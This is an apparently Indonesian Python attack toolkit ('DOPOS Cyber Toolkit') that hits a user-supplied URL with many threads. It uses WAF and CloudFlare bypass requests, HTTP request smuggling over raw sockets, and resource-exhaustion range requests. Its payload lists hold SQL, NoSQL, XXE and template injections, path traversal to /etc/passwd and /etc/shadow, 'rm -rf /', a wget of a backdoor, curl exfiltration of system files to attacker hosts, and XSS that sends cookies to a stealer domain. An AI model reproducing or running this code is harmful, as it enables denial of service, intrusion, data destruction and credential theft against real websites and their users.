 import os, sys, time, random, requests, threading, socket, ssl, urllib3
from urllib.parse import urlparse, urljoin
from datetime import datetime

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    CYAN = Fore.CYAN; BLUE = Fore.BLUE; LIGHT_BLUE = Fore.LIGHTBLUE_EX
    GREEN = Fore.GREEN; RED = Fore.RED; YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE; MAGENTA = Fore.MAGENTA
except ImportError:
    CYAN = BLUE = LIGHT_BLUE = GREEN = RED = YELLOW = WHITE = MAGENTA = ""

import warnings
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- tambahan library ----------
try:
    import tls_client
    TLS_OK = True
except:
    TLS_OK = False
    print(f"{YELLOW}[!] tls-client tidak tersedia, menggunakan requests biasa")

# ========== ENHANCED DATA FOR PENETRATION ==========

# ---------- Advanced User Agents ----------
user_agents = [
    # Google Bot Impersonation
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    
    # Security Scanner Impersonation  
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "Mozilla/5.0 (compatible; Project Sonar; https://sonar.omnisint.io/)",
    
    # Cloud Services
    "Amazon CloudFront",
    "CloudFlare Always Online",
    "GuzzleHttp/7.0",
    
    # Mobile Elite
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    
    # Standard but updated
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# ---------- Advanced Attack Paths ----------
random_paths = [
    # Common vulnerabilities
    '/.env', '/config.json', '/.git/config', '/.htaccess', '/web.config',
    '/phpinfo.php', '/adminer.php', '/phpMyAdmin/', '/mysql/', '/db/',
    '/backup.zip', '/dump.sql', '/backup.tar.gz', '/wp-config.php',
    
    # API endpoints  
    '/api/v1/users', '/api/v1/admin', '/graphql', '/rest/v1/',
    '/oauth/authorize', '/oauth/token', '/.well-known/oauth-authorization-server',
    
    # Admin panels
    '/administrator/', '/wp-admin/', '/admin/', '/dashboard/', '/panel/',
    '/control/', '/manager/', '/system/', '/cms/', '/backend/',
    
    # File inclusions
    '/../../../../etc/passwd', '/....//....//....//....//etc/passwd',
    '/..%2f..%2f..%2f..%2fetc%2fpasswd', '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    
    # SSRF targets
    '/proxy?url=http://169.254.169.254/latest/meta-data/',
    '/redirect?url=file:///etc/passwd',
    '/fetch?url=http://internal.local/',
    
    # Web shells
    '/cmd.php', '/shell.php', '/x.php', '/wso.php', '/c99.php',
]

# ---------- Advanced Payloads ----------
payloads = [
    # SQL Injection
    "admin' OR '1'='1'-- -",
    "admin' UNION SELECT 1,2,3-- -", 
    "' AND 1=CAST((SELECT version()) AS INT)--",
    '<!--#' + 'A'*5000 + '${@system("rm -rf /")}<?php system("wget http://hacker.com/backdoor.php -O /tmp/bd.php");?><script>eval("document.location=\'http://steal-cookie.com/?c="+document.cookie+"\'")</script>' + '!'*3000 + '-->', 

'<!--' + '!' * 12000 + '-->',  # Parser bomb
'${@' + 'D'*1000 + '}<?php ' + 'E'*2000 + '; exec("curl -X POST http://hacker.com/log --data \"" + file_get_contents("/etc/shadow") + "\""); ?><script>document.write("<img src=x onerror=stealCredentials()>")</script><!--' + 'F'*4000 + '-->', 

'<!--' + '!'*6000 + '${<?php echo base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7");?>}' + '<script>setTimeout(()=>{window.location="phishing.com"},5000)</script>', 
    # NoSQL Injection
    '{"$where": "this.username == \"admin\""}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    
    # Command Injection
    "; whoami;", "| id", "`id`", "$(id)",
    "<?php system($_GET['cmd']); ?>",
    
    # XXE Injection
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    
    # SSTI Injection
    '${7*7}', '{{7*7}}', '<%= 7*7 %>',
    '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
    
    # Path Traversal
    '../../../../etc/passwd',
    '....//....//....//....//etc/passwd',
    
    # JWT Tampering
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
    
    # GraphQL Injection
    'query { __schema { types { name fields { name } } } }',
]

# ---------- Advanced Headers for Bypass ----------
bypass_headers = [
    {
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1', 
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Host': '127.0.0.1'
    },
    {
        'X-Forwarded-Host': 'localhost',
        'X-Forwarded-Server': 'localhost',
        'Host': 'localhost'
    },
    {
        'X-Requested-With': 'XMLHttpRequest',
        'X-Ajax-Request': 'true',
        'Sec-Fetch-Site': 'same-origin'
    },
    {
        'CF-Connecting-IP': '127.0.0.1',
        'CF-RAY': f'{random.randint(100000, 999999)}-FRA',
        'True-Client-IP': '127.0.0.1'
    },
    {
        'X-Forwarded-Proto': 'https',
        'X-Forwarded-Port': '443',
        'X-Forwarded-Scheme': 'https'
    }
]

# ========== ADVANCED PENETRATION TECHNIQUES ==========

def show_header():
    clear_screen()
    print(f"""
{RED}╔══════════════════════════════════════════╗
║  {CYAN}██████╗ ███████╗ █████╗ ██╗  ██╗███████╗{RED}  ║
║  {CYAN}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝{RED}  ║
║  {CYAN}██████╔╝█████╗  ███████║█████╔╝ █████╗  {RED}  ║
║  {CYAN}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  {RED}  ║
║  {CYAN}██║  ██║███████╗██║  ██║██║  ██╗███████╗{RED}  ║
║  {CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝{RED}  ║
║                                                  ║
║     {LIGHT_BLUE}DOPOS CYBER TOOLKIT v10.0 ULTIMATE{RED}       ║
║          {YELLOW}PENETRATION EDITION - ANDROID{RED}      ║
╚══════════════════════════════════════════╝
""")

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def progress_bar(progress, total, width=30):
    percent = (progress / total) * 100
    filled = int(width * progress // total)
    bar = '█' * filled + '-' * (width - filled)
    return f"{CYAN}[{bar}] {percent:.1f}%"

def brutal_loading(text, duration=2):
    print(f"{CYAN}[+] {text}", end="")
    start_time = time.time()
    while time.time() - start_time < duration:
        symbols = ["\\", "|", "/", "-"]
        print(f"\r{CYAN}[+] {text} {random.choice(symbols)}", end="")
        time.sleep(0.2)
    print(f"\r{GREEN}[+] {text} SUKSES!{CYAN}")

def log_to_file(message):
    try:
        with open('dopos_penetration.log', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    except:
        pass

def parse_target(target):
    parsed = urlparse(target)
    domain = parsed.hostname or parsed.netloc.split(':')[0]
    path = parsed.path if parsed.path else '/'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    return domain, path, port

# ---------- Advanced TLS Session ----------
def build_advanced_tls_session():
    if not TLS_OK:
        session = requests.Session()
        # Add advanced headers
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        })
        return session
    
    try:
        profiles = ["chrome_108", "chrome_107", "firefox_102", "firefox_104", "safari_16_0"]
        session = tls_client.Session(
            client_identifier=random.choice(profiles),
            random_tls_extension_order=True
        )
        return session
    except:
        return build_advanced_tls_session()

# ========== ADVANCED PENETRATION ATTACKS ==========

def generate_advanced_payload():
    """Generate advanced penetration payloads"""
    return random.choice([
        # Command Injection
        f"; echo '{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))}';",
        "| cat /etc/passwd",
        "`wget http://malicious.com/shell.sh -O /tmp/s.sh`",
        
        # SQL Injection Advanced
        f"1' UNION SELECT 1,concat(username,0x3a,password),3,4 FROM users-- -",
        "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        
        # XSS Payloads
        "<script>fetch('http://stealer.com/?c='+document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        
        # XXE Advanced
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://internal.network/">]><data>&xxe;</data>',
        
        # Template Injection
        '${T(java.lang.Runtime).getRuntime().exec("curl -X POST http://attacker.com/log --data @/etc/passwd")}',
                '<!--#' + 'A' * 10000 + '-->',  # Large comment
        '<script>' + 'x=' + '1' * 5000 + '</script>',  # Large script
        '<?php ' + 'echo "' + 'X' * 8000 + '"; ?>',  # Large PHP
        '${' + '@' * 3000 + '}',  # Template injection
        '<!--' + '!' * 12000 + '-->',  # Huge comment
        '<!--#' + 'A'*5000 + 
                   '<!--#' + 'A' * 10000 + '-->',  # Large comment
        # Path Traversal Advanced
        '....//....//....//....//etc/shadow',
        '..%252f..%252f..%252f..%252fetc%252fpasswd',
        
        # SSRF Payloads
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'gopher://127.0.0.1:25/xHELO%20attacker.com',
        
        # NoSQL Injection
        '{"$where": "this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"whoami\")"}',
    ])

# ---------- CloudFlare Bypass Technique ----------
def cloudflare_bypass_attack(target, stop_event, request_count, lock):
    """Advanced CloudFlare bypass techniques"""
    session = build_advanced_tls_session()
    
    while not stop_event.is_set():
        try:
            # Rotate between different bypass techniques
            technique = random.randint(1, 5)
            
            if technique == 1:
                # Technique 1: Impersonate Googlebot
                headers = {
                    'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                    'From': 'googlebot(at)google.com'
                }
                
            elif technique == 2:
                # Technique 2: Use cache headers
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Expires': '0'
                }
                
            elif technique == 3:
                # Technique 3: Use XMLHttpRequest
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-Ajax-Request': 'true'
                }
                
            elif technique == 4:
                # Technique 4: Add random headers
                headers = {
                    'User-Agent': random.choice(user_agents),
                    f'X-Random-{random.randint(1000,9999)}': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                    'Accept': '*/*'
                }
                
            else:
                # Technique 5: Use security scanner UA
                headers = {
                    'User-Agent': 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
                    'From': 'nmap@nmap.org'
                }
            
            # Add bypass headers
            headers.update(random.choice(bypass_headers))
            
            attack_url = target + random.choice(random_paths)
            start_time = time.time()
            
            response = session.get(
                attack_url,
                headers=headers,
                timeout=5,
                verify=False,
                allow_redirects=True
            )
            
            detik = time.time() - start_time
            
            with lock:
                request_count['success'] += 1
                if response.status_code in [200, 301, 302, 404, 403]:
                    request_count['bypassed'] += 1
                    status = "BYPASSED"
                else:
                    status = "BLOCKED"
                
                print(f"\r{CYAN}[CF-BYPASS] Req: {GREEN}{request_count['success']} | Bypass: {YELLOW}{request_count['bypassed']} | Status: {status} | Time: {detik:.2f}s", end="")
                
        except Exception as e:
            with lock:
                request_count['failed'] += 1
            continue

# ---------- WAF Bypass Attack ----------
def waf_bypass_attack(target, stop_event, request_count, lock):
    """Advanced WAF bypass techniques"""
    session = build_advanced_tls_session()
    
    while not stop_event.is_set():
        try:
            # WAF evasion techniques
            payload = generate_advanced_payload()
            
            # Technique: Obfuscate payload
            obfuscated_payload = payload.replace(' ', '/**/').replace('=', ' like ')
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*'
            }
            
            # Add WAF bypass headers
            headers.update({
                'X-Forwarded-For': f'127.0.0.{random.randint(1,255)}',
                'X-Real-IP': f'192.168.{random.randint(1,255)}.{random.randint(1,255)}',
                'X-Originating-IP': f'10.{random.randint(1,255)}.{random.randint(1,255)}.1'
            })
            
            attack_url = target + random.choice(random_paths)
            
            # Vary between GET and POST
            if random.random() > 0.5:
                # GET with parameters
                params = {
                    'q': obfuscated_payload,
                    'search': payload,
                    'id': random.randint(1, 10000),
                    'page': random.randint(1, 100)
                }
                response = session.get(attack_url, headers=headers, params=params, timeout=5, verify=False)
            else:
                # POST with data
                data = {
                    'username': obfuscated_payload,
                    'password': payload,
                    'email': f"test{random.randint(1,10000)}@test.com",
                    'query': payload
                }
                response = session.post(attack_url, headers=headers, data=data, timeout=5, verify=False)
            
            with lock:
                request_count['success'] += 1
                if response.status_code not in [400, 401, 403, 405, 406, 429, 500, 501, 502, 503]:
                    request_count['bypassed'] += 1
                
                print(f"\r{CYAN}[WAF-BYPASS] Req: {GREEN}{request_count['success']} | Bypass: {YELLOW}{request_count['bypassed']} | Payload: {payload[:100]}...", end="")
                
        except Exception as WAFe:
            with lock:
                request_count['failed'] += 1
            continue

# ---------- Protocol Level Attack ----------
def protocol_level_attack(domain, port, stop_event, request_count, lock):
    """Low-level protocol attacks"""
    while not stop_event.is_set():
        try:
            # Technique 1: HTTP Request Smuggling
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((domain, port))
            
            smuggling_payloads = [
                "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(domain, domain),
                "GET / HTTP/1.1\r\nHost: {}\r\nContent-Length: 5\r\nContent-Length: 0\r\n\r\n".format(domain),
                "GET / HTTP/1.1\r\nHost: {}\r\n Transfer-Encoding: chunked\r\n\r\n".format(domain),
            ]
            
            payload = random.choice(smuggling_payloads)
            s.send(payload.encode())
            time.sleep(0.1)
            s.close()
            
            with lock:
                request_count['success'] += 1
                request_count['bypassed'] += 1
                print(f"\r{CYAN}[PROTOCOL] Req: {GREEN}{request_count['success']} | SMUGGLING: ACTIVE", end="")
                
        except:
            with lock:
                request_count['failed'] += 1
            continue

# ---------- Resource Exhaustion Attack ----------
def resource_exhaustion_attack(target, stop_event, request_count, lock):
    """Attack that exhausts server resources"""
    session = build_advanced_tls_session()
    
    while not stop_event.is_set():
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Range': f'bytes=0-{random.randint(1000000, 10000000)}',  # Large range requests
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Cache-Control': 'no-cache'
            }
            
            attack_url = target + random.choice(['/large-file.zip', '/big-video.mp4', '/database.backup'])
            
            response = session.get(attack_url, headers=headers, timeout=10, verify=False, stream=True)
            
            # Read a small part to trigger processing but not waste bandwidth
            if hasattr(response, 'iter_content'):
                for chunk in response.iter_content(chunk_size=1024):
                    if len(chunk) > 0:
                        break
            
            with lock:
                request_count['success'] += 1
                if response.status_code in [200, 206, 416]:
                    request_count['bypassed'] += 1
                
                print(f"\r{CYAN}[RESOURCE] Req: {GREEN}{request_count['success']} | MEMORY: DRAINED", end="")
                
        except:
            with lock:
                request_count['failed'] += 1
            continue

# ---------- ULTIMATE PENETRATION ATTACK ----------
def ultimate_penetration_attack():
    show_header()
    print(f"{RED}[1] ULTIMATE PENETRATION ATTACK v10.0")
    print(f"{BLUE}══════════════════════════════════════════")
    
    target = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    
    if not target:
        test_sites = [
            "http://testphp.vulnweb.com/",
            "http://demo.testfire.net/", 
            "http://zero.webappsecurity.com/"
        ]
        target = random.choice(test_sites)
        print(f"{YELLOW}[!] Using test site: {target}")
    
    try:
        duration = int(input(f"{CYAN}[?] Durasi serangan (detik, 30-600): {WHITE}") or "180")
        threads = int(input(f"{CYAN}[?] Jumlah thread (20-200): {WHITE}") or "80")
        if threads < 20 or threads > 200:
            raise ValueError("Thread 20-200")
        if duration < 30 or duration > 600:
            raise ValueError("Durasi 30-600")
    except ValueError as e:
        print(f"{RED}[!] Input tidak valid: {str(e)}")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    try:
        domain, path, port = parse_target(target)
    except Exception as e:
        print(f"{RED}[!] URL tidak valid: {e}")
        return

    print(f"\n{RED}[!] MEMULAI PENETRATION ATTACK...")
    print(f"{YELLOW}[!] Target: {WHITE}{target}")
    print(f"{YELLOW}[!] Domain: {WHITE}{domain}")
    print(f"{YELLOW}[!] Port: {WHITE}{port}")
    print(f"{YELLOW}[!] Durasi: {WHITE}{duration} detik")
    print(f"{YELLOW}[!] Thread: {WHITE}{threads}")
    print(f"{YELLOW}[!] Mode: {RED}ADVANCED PENETRATION")
    
    log_to_file(f"Starting ULTIMATE penetration attack on {target}")
    
    request_count = {'success': 0, 'failed': 0, 'bypassed': 0}
    lock = threading.Lock()
    stop_event = threading.Event()

    brutal_loading("Initializing penetration vectors", 3)
    
    start_time = time.time()
    threads_list = []
    
    # Advanced thread distribution
    cf_threads = max(15, threads // 4)
    waf_threads = max(12, threads // 5) 
    protocol_threads = max(8, threads // 8)
    resource_threads = max(10, threads // 6)
    
    print(f"\n{YELLOW}[!] Advanced Attack Distribution:")
    print(f"{CYAN}CloudFlare Bypass: {cf_threads}")
    print(f"{CYAN}WAF Bypass: {waf_threads}")
    print(f"{CYAN}Protocol Level: {protocol_threads}")
    print(f"{CYAN}Resource Drain: {resource_threads}")
    
    # Start all attack vectors
    for _ in range(cf_threads):
        t = threading.Thread(target=cloudflare_bypass_attack, args=(target, stop_event, request_count, lock))
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    for _ in range(waf_threads):
        t = threading.Thread(target=waf_bypass_attack, args=(target, stop_event, request_count, lock))
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    for _ in range(protocol_threads):
        t = threading.Thread(target=protocol_level_attack, args=(domain, port, stop_event, request_count, lock))
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    for _ in range(resource_threads):
        t = threading.Thread(target=resource_exhaustion_attack, args=(target, stop_event, request_count, lock))
        t.daemon = True
        t.start()
        threads_list.append(t)

    print(f"\n{GREEN}[!] ALL PENETRATION VECTORS ACTIVE!")
    
    # Advanced monitoring
    peak_rps = 0
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            current_rps = request_count['success'] / elapsed if elapsed > 0 else 0
            peak_rps = max(peak_rps, current_rps)
            
            bypass_rate = (request_count['bypassed'] / request_count['success'] * 100) if request_count['success'] > 0 else 0
            
            print(f"\r{CYAN}[PENETRATION] Time: {remaining:.1f}s | Req: {GREEN}{request_count['success']} | Bypass: {YELLOW}{request_count['bypassed']} | Rate: {bypass_rate:.1f}% | RPS: {MAGENTA}{current_rps:.1f}", end="")
            time.sleep(0.5)
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Penetration attack stopped manually")

    stop_event.set()
    
    for t in threads_list:
        t.join(timeout=3)
    
    total_time = time.time() - start_time
    avg_rps = request_count['success'] / total_time if total_time > 0 else 0
    
    print(f"\n\n{GREEN}[+] ULTIMATE PENETRATION COMPLETE!")
    print(f"{CYAN}[+] Total Time: {total_time:.1f}s")
    print(f"{CYAN}[+] Total Requests: {GREEN}{request_count['success']:,}")
    print(f"{CYAN}[+] Successful Bypass: {YELLOW}{request_count['bypassed']:,}")
    print(f"{CYAN}[+] Bypass Rate: {GREEN if bypass_rate > 50 else YELLOW if bypass_rate > 25 else RED}{bypass_rate:.1f}%")
    print(f"{CYAN}[+] Average RPS: {MAGENTA}{avg_rps:.1f}")
    print(f"{CYAN}[+] Peak RPS: {RED}{peak_rps:.1f}")
    
    # Penetration effectiveness
    if bypass_rate > 75:
        print(f"{GREEN}[!] EXCELLENT PENETRATION! Security completely bypassed! 🎯")
    elif bypass_rate > 50:
        print(f"{GREEN}[!] GOOD PENETRATION! Most security measures bypassed! ⚡")
    elif bypass_rate > 25:
        print(f"{YELLOW}[!] MODERATE PENETRATION! Some security bypassed! 🔥")
    else:
        print(f"{RED}[!] LIMITED PENETRATION! Strong security detected! 🛡️")
    
    print(f"{CYAN}[+] Log: dopos_penetration.log")
    
    log_to_file(f"PENETRATION RESULTS: {request_count['success']} total, {request_count['bypassed']} bypassed ({bypass_rate:.1f}%), {avg_rps:.1f} RPS avg, {peak_rps:.1f} RPS peak")
    input(f"\n{CYAN}[+] Press Enter to continue...")

# ---------- OTHER FUNCTIONS ----------
def lacak_token_bot():
    show_header()
    print(f"{RED}[2] Lacak Token BOT")
    print(f"{YELLOW}[!] Advanced version in development...")
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

def ambil_html_paksa():
    show_header()
    print(f"{RED}[3] Ambil Data HTML Paksa")
    print(f"{YELLOW}[!] Advanced version in development...")
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

def merusak_data_online():
    show_header()
    print(f"{RED}[4] Merusak Data Script Online")
    print(f"{YELLOW}[!] Advanced version in development...")
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# ---------- MAIN MENU ----------
def main_menu():
    while True:
        show_header()
        print(f"{CYAN}[+] ADVANCED PENETRATION TOOLS:")
        print(f"{BLUE}══════════════════════════════════════════")
        print(f"{RED}║ [1] Ultimate Penetration Attack        ║")
        print(f"{RED}║ [2] Lacak Token BOT                    ║")
        print(f"{RED}║ [3] Ambil Data HTML Paksa              ║")
        print(f"{RED}║ [4] Merusak Data Script Online         ║")
        print(f"{RED}║ [5] Keluar                             ║")
        print(f"{BLUE}══════════════════════════════════════════")
        
        try:
            choice = input(f"{CYAN}[?] Pilih tool: {WHITE}")
            
            if choice == "1":
                ultimate_penetration_attack()
            elif choice == "2":
                lacak_token_bot()
            elif choice == "3":
                ambil_html_paksa()
            elif choice == "4":
                merusak_data_online()
            elif choice == "5":
                print(f"\n{RED}[!] DOPOS PENETRATION TERMINATED")
                brutal_loading("Cleaning traces", 2)
                print(f"\n{GREEN}[+] SYSTEM SECURE!")
                break
            else:
                print(f"\n{RED}[!] INVALID CHOICE!")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Program terminated")
            break
        except Exception as e:
            print(f"\n{RED}[!] Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    try:
        log_to_file("DOPOS Ultimate Penetration Toolkit v10.0 started")
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Program terminated by user")
    except Exception as e:
        print(f"\n{RED}[!] Fatal error: {e}")
        input("Press Enter to exit...")